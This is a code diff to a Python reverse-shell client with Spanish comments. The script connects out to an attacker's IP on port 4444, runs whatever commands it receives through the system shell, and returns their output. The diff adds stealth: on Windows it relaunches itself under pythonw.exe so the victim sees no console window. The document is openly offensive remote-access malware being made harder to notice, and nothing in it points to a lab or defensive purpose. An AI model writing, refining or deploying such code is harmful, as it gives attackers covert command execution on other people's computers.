@@ -1,6 +1,7 @@
 import socket
 import subprocess
 import os
+import sys
 
 def start_reverse_shell(server_ip, server_port):
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -19,6 +20,7 @@ def start_reverse_shell(server_ip, server_port):
                 client.send(str(e).encode())
         else:
             try:
+                # Ejecuta el comando sin mostrar la ventana de la consola
                 output = subprocess.run(command, shell=True, capture_output=True, text=True)
                 client.send(output.stdout.encode() + output.stderr.encode())
             except Exception as e:
@@ -27,5 +29,8 @@ def start_reverse_shell(server_ip, server_port):
     client.close()
 
 if __name__ == '__main__':
-    # Reemplaza 'attacker_ip' con la IP del servidor atacante y 4444 con el puerto usado
-    start_reverse_shell('La ip de atacante', 4444)
+    # Oculta la consola en Windows
+    if os.name == 'nt':
+        subprocess.Popen(['pythonw.exe'] + sys.argv)
+    else:
+        start_reverse_shell('La ip de atacante', 4444)
